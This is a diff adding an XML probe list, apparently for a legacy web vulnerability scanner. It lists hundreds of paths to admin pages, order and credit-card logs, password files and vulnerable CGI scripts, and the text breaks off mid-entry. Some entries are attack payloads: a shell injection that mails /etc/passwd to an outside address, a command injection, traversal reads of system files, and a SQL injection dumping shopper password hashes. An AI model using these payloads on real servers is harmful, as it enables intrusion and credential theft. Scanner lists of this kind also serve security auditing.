@@ -1,0 +1,4548 @@
+<url>
+   <get>/</get>
+   <info>Server root</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/........</get>
+   <info>/........./</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/........./autoexec.bat</get>
+   <info>/........./autoexec.bat</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/....../......ida/con</get>
+   <info>....../......ida/con</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/....../autoexec.bat</get>
+   <info>autoexec.bat</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/..../Windows/Admin.pwl</get>
+   <info>..../Windows/Admin.pwl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/../..</get>
+   <info>iss ../..</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/../../boot.ini</get>
+   <info>alibaba hole</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/../../config.sys</get>
+   <info>/../../config.sys</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/.html/......</get>
+   <info>.html/......</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/.html/............../config.sys</get>
+   <info>ICQweb</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/.html/............./config.sys</get>
+   <info>/.html/............./config.sys</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/.html/............/autoexec.bat</get>
+   <info>/.html/............/autoexec.bat</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/?PageServices</get>
+   <info>Administrator page for Netscape Server</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/AT-admin.cgi</get>
+   <info>/AT-admin.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/Admin</get>
+   <info>/Admin</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/Admin_files/order.log</get>
+   <info>/Admin_files/order.log</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/Administration</get>
+   <info>/Administration</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/AnForm2</get>
+   <info>/AnForm2</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/AnyForm2</get>
+   <info>/AnyForm2</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/CFIDE/Administrator/startstop.html</get>
+   <info>startstop.html</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/Count.cgi</get>
+   <info>/Count.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/DataBase</get>
+   <info>DataBase/</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/GetFile.cfm</get>
+   <info>GetFile.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/Orders/order.log</get>
+   <info>/Orders/order.log</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/PDG_Cart/order.log</get>
+   <info>PDGorderlog</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/PDG_Cart/shopper.conf</get>
+   <info>shopper.conf</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/PSUser/PSCOErrPage.htm</get>
+   <info>PSCOErrPage.htm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/WebSTAR</get>
+   <info>/WebSTAR</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/WebSTART%20LOG</get>
+   <info>WebSTART%20LOG</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/WebShop/logs/cc.txt</get>
+   <info>cc.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/WebShop/logs/ck.log</get>
+   <info>/WebShop/logs/ck.log</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/WebShop/templates/cc.txt</get>
+   <info>cc.txt 2</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/_AuthChangeUrl?</get>
+   <info>/_AuthChangeUrl?</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/__vti_inf.html</get>
+   <info>FP check;by Void;</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/_private</get>
+   <info>/_private</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/_private/form_results.htm</get>
+   <info>form_results.htm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/_private/form_results.txt</get>
+   <info>form_results.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/_private/orders.htm</get>
+   <info>orders.htm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/_private/orders.txt</get>
+   <info>orders.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/_private/register.htm</get>
+   <info>register.htm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/_private/register.txt</get>
+   <info>register.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/_private/registrations.htm</get>
+   <info>registrations 2</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/_private/registrations.txt</get>
+   <info>registrations</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/activex</get>
+   <info>/activex</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/admcgi/contents.htm</get>
+   <info>admcgi contents</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/admin</get>
+   <info>/admin</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/admin-serv/config/admpw</get>
+   <info>/admin-serv/config/admpw</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/admin.cgi</get>
+   <info>/admin.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/admin.htm</get>
+   <info>/admin.htm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/admin.html</get>
+   <info>/admin.html</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/admin.php3</get>
+   <info>/admin.php3</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/admin.pl</get>
+   <info>/admin.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/admin.shtml</get>
+   <info>/admin.shtml</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/administration</get>
+   <info>/administration</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/adminlogin?RCpage=/sysadmin/index.stm</get>
+   <info>adminlogin</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/admisapi/fpadmin.htm</get>
+   <info>fpadmin.htm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/adsamples/config/site.csc</get>
+   <info>site.csc</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/aglimpse</get>
+   <info>/aglimpse</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/archive</get>
+   <info>/archive</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/auth</get>
+   <info>/auth</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/aux</get>
+   <info>aux check</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/backdoor</get>
+   <info>/backdoor</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/backup</get>
+   <info>/backup</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/bb-dnbd/bb-hist.sh</get>
+   <info>/bb-hist.sh</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/bb-hist.sh</get>
+   <info>/bb-hist.sh</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/beta</get>
+   <info>/beta</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/bin</get>
+   <info>/bin</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/bnbform.cgi</get>
+   <info>/bnbform.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/campas</get>
+   <info>/campas</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/carbo.dll</get>
+   <info>carbo.dll</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfappman/index.cfm</get>
+   <info>cfappman</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/MOLE.CFM</get>
+   <info>/cfdocs/MOLE.CFM</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/TOXIC.CFM</get>
+   <info>/cfdocs/TOXIC.CFM</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/cfmlsyntaxcheck.cfm</get>
+   <info>cfmlsyntaxcheck</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/exampleapp/docs/sourcewindow.cfm</get>
+   <info>sourcewindow.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/exampleapp/email/application.cfm</get>
+   <info>application.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/exampleapp/email/getfile.cfm</get>
+   <info>/cfdocs/exampleapp/email/namefile.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/exampleapp/email/getfile.cfm?filename=c:\boot.ini</get>
+   <info>getfile.cfm?</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/exampleapp/publish/admin/addcontent.cfm</get>
+   <info>addcontent.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/exampleapp/publish/admin/application.cfm</get>
+   <info>application.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/examples/cvbeans/beaninfo.cfm</get>
+   <info>beaninfo.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/examples/mainframeset.cfm</get>
+   <info>mainframeset.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/examples/parks/detail.cfm</get>
+   <info>detail.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/expelval/displayopenedfile.cfm</get>
+   <info>dispopenfile.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/expelval/exprcalc.cfm</get>
+   <info>exprcalc.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/expelval/openfile.cfm</get>
+   <info>openfile.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/expelval/sendmail.cfm</get>
+   <info>sendmail.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/expelvel/openfile.cfm</get>
+   <info>openfile.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/expeval/displayopenedfile.cfm</get>
+   <info>/cfdocs/expeval/displayopenedfile.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/expeval/eval.cfm</get>
+   <info>expeval/eval.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/expeval/exprcalc.cfm</get>
+   <info>/cfdocs/expeval/exprcalc.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/expeval/openfile.cfm</get>
+   <info>/cfdocs/expeval/openfile.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/expeval/sendmail.cfm</get>
+   <info>/cfdocs/expeval/sendmail.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/expressions.cfm</get>
+   <info>expressions.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/mole.cfm</get>
+   <info>/cfdocs/mole.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/root.cfm</get>
+   <info>cfdocs/root.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/snippets/evaluate.cfm</get>
+   <info>evaluate.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/snippets/fileexist.cfm</get>
+   <info>fileexist.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/snippets/fileexists.cfm</get>
+   <info>fileexists.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/snippets/gettempdirectory.cfm</get>
+   <info>gettempdirectory</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/snippets/viewexample.cfm</get>
+   <info>viewexample.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/toxic.cfm</get>
+   <info>/cfdocs/toxic.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfdocs/zero.cfm</get>
+   <info>cfdocs/zero.cfm</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfusion/cfapps/forums/data/forums.mdb</get>
+   <info>data/forums.mdb</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfusion/cfapps/forums/forums_.mdb</get>
+   <info>forums_.mdb</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfusion/cfapps/security/data/realm.mdb</get>
+   <info>data/realm.mdb</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfusion/cfapps/security/realm_.mdb</get>
+   <info>realm_.mdb</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfusion/database/cfexamples.mdb</get>
+   <info>cfexamples.mdb</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfusion/database/cfsnippets.mdb</get>
+   <info>cfsnippets.mdb</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfusion/database/cypress.mdb</get>
+   <info>cypress.mdb</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cfusion/database/smpolicy.mdb</get>
+   <info>smpolicy.mdb</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi</get>
+   <info>/cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bib/everythingform</get>
+   <info>/cgi-bib/everythingform</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin</get>
+   <info>cgi-bin list</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/.cobalt/siteUserMod/siteUserMod.cgi</get>
+   <info>siteUserMod.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/.fhp</get>
+   <info>.fhp</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/AT-admin.cgi</get>
+   <info>AT-admin.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/AT-generate.cgi</get>
+   <info>AT-generate.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/AnForm2</get>
+   <info>AnForm2</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/AnyBoard.cgi</get>
+   <info>AnyBoard.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/AnyForm2</get>
+   <info>AnyForm2</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/Cgitest.exe</get>
+   <info>/cgi-bin/Cgitest.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/Count.cgi</get>
+   <info>Count.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/FormHandler.cgi</get>
+   <info>FormHandler.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/GW5/GWWEB.EXE</get>
+   <info>GW5/GWWEB.EXE</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/LWGate</get>
+   <info>LWGate</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/LWGate.cgi</get>
+   <info>LWGate.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/MachineInfo</get>
+   <info>MachineInfo</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/Textcounter.pl</get>
+   <info>[CGI] Textcounter.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/UltraBoard.cgi</get>
+   <info>/cgi-bin/UltraBoard.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/UltraBoard.pl</get>
+   <info>/cgi-bin/UltraBoard.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/add_ftp.cgi</get>
+   <info>add_ftp.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/af.cgi</get>
+   <info>/cgi-bin/af.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/aglimpse</get>
+   <info>aglimpse</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/aglimpse/80|IFS=5;CMD=5mail5dashie\@cyberdude.com\</etc/passwd;eval$CMD;echo</get>
+   <info>/cgi-bin/aglimpse/80|IFS=5;CMD=5mail5dashie\@cyberdude.com\</etc/passwd;eval$CMD;echo</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/alibaba.pl</get>
+   <info>ali check</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/anyboard.cgi</get>
+   <info>/cgi-bin/anyboard.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/archie</get>
+   <info>archie</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/architext_query.cgi</get>
+   <info>architext_q.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/architext_query.pl</get>
+   <info>/cgi-bin/architext_query.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/awl/auctionweaver.pl</get>
+   <info>/cgi-bin/awl/auctionweaver.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/ax-admin.cgi</get>
+   <info>ax-admin.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/ax.cgi</get>
+   <info>ax.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/axs.cgi</get>
+   <info>axs.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/bb-hist.sh</get>
+   <info>bb-hist.sh</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/bb-hostsvc.sh</get>
+   <info>/cgi-bin/bb-hostsvc.sh</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/bigconf.cgi</get>
+   <info>bigconf.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/bizdb1-search.cgi</get>
+   <info>bizdb1-search.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/bnbform.cgi</get>
+   <info>bnbform.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/bulk/bulk.cgi</get>
+   <info>/cgi-bin/bulk/bulk.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/c_download.cgi</get>
+   <info>c_download.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/cachemgr.cgi</get>
+   <info>cachemgr.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/calendar</get>
+   <info>calendar</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/campas</get>
+   <info>campas</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/campas?%0acat%0a/etc/passwd%0a</get>
+   <info>/cgi-bin/campas?%0acat%0a/etc/passwd%0a</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/cart.pl</get>
+   <info>cart.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/cgi-lib.pl</get>
+   <info>cgi-lib.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/cgiback.cgi</get>
+   <info>cgiback.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/cgitest.exe</get>
+   <info>cgitest.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/cgiwrap</get>
+   <info>cgiwrap</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/classified.cgi</get>
+   <info>classified cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/classifieds.cgi</get>
+   <info>classifieds.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/clickresponder.pl</get>
+   <info>/cgi-bin/clickresponder.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/count.cgi</get>
+   <info>remote execution of code;by Void;</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/cvsweb/src/usr.bin/rdist/expand.c</get>
+   <info>rdist/expand.c ?</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/data/nicks</get>
+   <info>/cgi-bin/data/nicks</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/day5datacopier.cgi</get>
+   <info>day5copier.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/day5datanotifier.cgi</get>
+   <info>/cgi-bin/day5datanotifier.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/dbmlparser.exe</get>
+   <info>dbmlparser.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/dfire.cgi</get>
+   <info>dfire.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/dig.cgi</get>
+   <info>cgi-bin/dig.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/displayTC.pl</get>
+   <info>displayTC.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/dnewsweb</get>
+   <info>/cgi-bin/dnewsweb</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/download.cgi</get>
+   <info>download.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/dumpenv</get>
+   <info>/cgi-bin/dumpenv</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/dumpenv.pl</get>
+   <info>dumpenv.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/echo.bat</get>
+   <info>echo.bat</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/edit.pl</get>
+   <info>edit.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/enter.cgi</get>
+   <info>enter.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/environ.cgi</get>
+   <info>environ.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/ews</get>
+   <info>ews</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/excite</get>
+   <info>excite</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/faxsurvey</get>
+   <info>faxsurvey</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/fexplore.exe</get>
+   <info>[CGI] Fpexplore.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/filemail.cgi</get>
+   <info>filemail.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/filemail.pl</get>
+   <info>/cgi-bin/filemail.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/files.pl</get>
+   <info>files.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/finger</get>
+   <info>finger</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/finger?@localhost</get>
+   <info>/cgi-bin/finger?@localhost</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/flexform.cgi</get>
+   <info>flexform.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/form.cgi</get>
+   <info>form.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/formmail.pl</get>
+   <info>@ny file retrieval;by Void;</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/formnow.cgi</get>
+   <info>/cgi-bin/formnow.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/fpexplore.exe</get>
+   <info>fpexplore.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/gH.cgi</get>
+   <info>gH.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/gbook/gbook.cgi</get>
+   <info>/cgi-bin/gbook/gbook.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/get32.exe</get>
+   <info>ali get32.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/getdoc.cgi</get>
+   <info>getdoc.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/glimpse</get>
+   <info>glimpse</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/guestbook.cgi</get>
+   <info>guestbook.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/guestbook.pl</get>
+   <info>guestbook.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/handler</get>
+   <info>handler</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/handler SH</get>
+   <info>/cgi-bin/handler SH</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/handler.cgi</get>
+   <info>/cgi-bin/handler.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/hello.bat</get>
+   <info>hello.bat</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/htmldocs</get>
+   <info>htmldocs</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/htmlscript</get>
+   <info>htmlscript</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/htmlscript?../../../../etc/passwd</get>
+   <info>/cgi-bin/htmlscript?../../../../etc/passwd</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/htsearch</get>
+   <info>htsearch</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/icat</get>
+   <info>icat</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/imagemap.c</get>
+   <info>/cgi-bin/imagemap.c</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/imagemap.exe</get>
+   <info>imagemap.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/info2www</get>
+   <info>info2www</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/infosrch.cgi</get>
+   <info>infosrch.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/input.bat</get>
+   <info>input.bat</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/input2.bat</get>
+   <info>/cgi-bin/input2.bat</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/jj</get>
+   <info>jj</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/lmail.pl</get>
+   <info>/cgi-bin/lmail.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/login.cgi</get>
+   <info>login.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/logs</get>
+   <info>cgi-bin/logs</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/ls</get>
+   <info>/cgi-bin/ls</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/lwgate</get>
+   <info>lwgate</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/lwgate.cgi</get>
+   <info>lwgate.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/maillist.cgi</get>
+   <info>maillist.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/maillist.pl</get>
+   <info>maillist.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/makechanges/easysteps/easysteps.pl</get>
+   <info>/cgi-bin/makechanges/easysteps/easysteps.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/man.sh</get>
+   <info>man.sh</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/message.cgi</get>
+   <info>message.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/meta.pl</get>
+   <info>meta.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/minimal.exe</get>
+   <info>minimal.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/mlog.phtml</get>
+   <info>mlog.phtml</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/ncommerce3/ExecMacro/orderdspc.d2w/report?order_rn=99999+union+select+CHAR(shlogid)||HEX(shlpswd)+as+mestname,0+from+shopper+where+shlpswd+is+not+null;</get>
+   <info>Net.Commerce user list</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/nlog-smb.cgi</get>
+   <info>nlog-smb.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/nph-error.pl</get>
+   <info>nph-error.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/nph-publish</get>
+   <info>nph-publish</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/nph-test-cgi</get>
+   <info>nph-test-cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/nph-test-cgi?*</get>
+   <info>/cgi-bin/nph-test-cgi?*</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/ntitar.pl</get>
+   <info>ntitar.pl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/passwd</get>
+   <info>passwd</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/passwd.txt</get>
+   <info>passwd.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/password</get>
+   <info>password</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/password.txt</get>
+   <info>password.txt</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/perl</get>
+   <info>/cgi-bin/perl</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/perl.exe</get>
+   <info>perl.exe</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/perlshop.cgi</get>
+   <info>perlshop.cgi</info>
+   <server></server>
+</url>
+
+<url>
+   <get>/cgi-bin/pfdispaly.cgi</get>
+   <info>pfdispaly.cgi</info>
+   <server></server>
+</url>
+
+<url>
